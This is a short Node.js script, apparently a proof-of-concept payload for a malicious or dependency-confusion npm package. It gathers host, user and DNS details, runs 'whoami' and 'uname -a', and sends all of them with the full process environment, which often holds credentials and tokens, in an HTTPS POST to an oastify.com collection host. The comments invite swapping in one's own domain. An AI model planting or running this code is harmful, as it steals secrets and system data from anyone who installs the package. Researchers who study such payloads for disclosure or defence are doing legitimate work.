// Author: security@threadsecurity.org

const { execSync } = require("child_process");
const https = require("https");
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");

// SYSTEM DATA COLLECTION
let hostname = os.hostname();
let homedir = os.homedir();
let username = os.userInfo().username;
let dnsServers = dns.getServers();
let platform = os.platform();
let arch = os.arch();
let uptime = os.uptime();

// EXECUTE SHELL COMMANDS FOR STRONG PROOF
let whoami = "";
let uname = "";
try {
    whoami = execSync("whoami").toString().trim();
    uname = execSync("uname -a").toString().trim();
} catch (err) {
    // Fallbacks if command fails
    whoami = "command_failed";
    uname = "command_failed";
}

// PACKAGE INFO
let packageData = {};
try {
    packageData = require("./package.json");
} catch (e) {
    packageData = { name: "unknown", version: "unknown" };
}

// COMPILE PAYLOAD
const trackingData = JSON.stringify({
    package: packageData.name,
    version: packageData.version,
    homedir,
    hostname,
    username,
    dnsServers,
    platform,
    arch,
    uptime,
    whoami,
    uname,
    cwd: process.cwd(),
    env: process.env,
});

// ENCODE FOR TRANSMISSION
const postData = querystring.stringify({ msg: trackingData });

// SEND TO YOUR SERVER (USE Interactsh/Burp/Pipedream)
const options = {
    hostname: "uvt5nul9m38jjlnz7ey9jl7hg8mzaryg.oastify.com", // Replace with your domain
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

const req = https.request(options, (res) => {
    res.on("data", (d) => {
        // Optional: console.log(d.toString());
    });
});

req.on("error", (e) => {
    // Optional: console.error(e);
});

req.write(postData);
req.end();
